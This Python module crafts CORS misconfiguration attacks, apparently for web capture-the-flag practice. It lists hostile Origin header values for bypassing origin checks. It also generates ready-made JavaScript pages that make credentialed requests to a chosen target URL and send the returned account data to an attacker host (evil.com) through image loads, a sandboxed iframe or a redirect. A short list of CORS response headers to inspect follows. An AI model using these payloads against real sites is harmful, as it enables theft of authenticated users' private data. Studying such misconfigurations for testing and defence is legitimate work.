"""
CORS (Cross-Origin Resource Sharing) Misconfiguration Payload Crafter for Web CTF.
Covers Origin reflection, null origin, trusted subdomain bypass, and credential theft vectors.
"""

from typing import List, Dict


def get_cors_test_origins() -> List[Dict[str, str]]:
    """Generate Origin header values to test for CORS misconfigurations."""
    return [
        {
            "name": "Reflected Origin (Echo)",
            "origin": "https://evil.com",
            "desc": "If server reflects Origin in Access-Control-Allow-Origin, it's vulnerable."
        },
        {
            "name": "Null Origin",
            "origin": "null",
            "desc": "Some servers whitelist 'null' origin (sandboxed iframes, file://)."
        },
        {
            "name": "Subdomain Trust Bypass",
            "origin": "https://evil.com.trusted.com",
            "desc": "Tests if server trusts any subdomain of the target domain."
        },
        {
            "name": "Prefix Trust Bypass",
            "origin": "https://trusted.com.evil.com",
            "desc": "Tests if server naively matches domain prefix (trusted.com.evil.com)."
        },
        {
            "name": "Suffix Trust Bypass",
            "origin": "https://eviltrusted.com",
            "desc": "Tests if server matches domain suffix (evil + trusted.com)."
        },
        {
            "name": "Scheme Confusion",
            "origin": "http://trusted.com",
            "desc": "Tests if server allows downgraded HTTP origin."
        },
        {
            "name": "Port Confusion",
            "origin": "https://trusted.com:8080",
            "desc": "Tests if server ignores port in origin matching."
        },
        {
            "name": "Attacker-Controlled Subdomain",
            "origin": "https://trusted.com.attacker.io",
            "desc": "Tests if server trusts any domain ending with target."
        },
        {
            "name": "Unicode / IDN Homograph",
            "origin": "https://trusted.com\u2024evil.com",
            "desc": "Uses Unicode lookalike characters to bypass string matching."
        },
        {
            "name": "Backslash / Dot Confusion",
            "origin": "https://trusted.com\\@evil.com",
            "desc": "URL parser confusion with backslash before @."
        }
    ]


def get_cors_exploit_payloads(target_url: str = "https://api.target.com/account") -> List[Dict[str, str]]:
    """Generate JavaScript PoC payloads to exploit CORS misconfigurations."""
    return [
        {
            "name": "Credential Theft PoC (Reflected Origin)",
            "payload": f"""<script>
var req = new XMLHttpRequest();
req.onload = function() {{
    var data = JSON.parse(this.responseText);
    new Image().src = 'https://evil.com/steal?data=' + btoa(JSON.stringify(data));
}};
req.open('GET', '{target_url}', true);
req.withCredentials = true;
req.send();
</script>""",
            "desc": "Steals authenticated data via reflected CORS origin."
        },
        {
            "name": "Null Origin Exploit (iframe sandbox)",
            "payload": f"""<iframe sandbox="allow-scripts" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = function() {{ new Image().src='https://evil.com/?d='+btoa(this.responseText); }};
req.open('GET','{target_url}',true); req.withCredentials=true; req.send();
</script>"></iframe>""",
            "desc": "Uses sandboxed iframe to send 'null' Origin header."
        },
        {
            "name": "Fetch API Credential Theft",
            "payload": f"""<script>
fetch('{target_url}', {{ credentials: 'include' }})
  .then(r => r.text())
  .then(d => location='https://evil.com/?data='+btoa(d));
</script>""",
            "desc": "Modern fetch-based credential theft with credentials included."
        }
    ]


def get_cors_headers_to_check() -> List[Dict[str, str]]:
    """List of response headers to inspect for CORS misconfiguration."""
    return [
        {
            "header": "Access-Control-Allow-Origin",
            "desc": "If it reflects the Origin header or is '*', misconfiguration possible."
        },
        {
            "header": "Access-Control-Allow-Credentials",
            "desc": "If 'true' combined with a reflected/trusted origin, credentials are exposed."
        },
        {
            "header": "Access-Control-Allow-Methods",
            "desc": "Check if dangerous methods (PUT, DELETE) are allowed."
        },
        {
            "header": "Access-Control-Allow-Headers",
            "desc": "Check if sensitive headers (Authorization, X-Admin) are allowed."
        },
        {
            "header": "Access-Control-Expose-Headers",
            "desc": "Check if sensitive response headers are exposed to JS."
        },
        {
            "header": "Access-Control-Max-Age",
            "desc": "Preflight caching duration."
        }
    ]
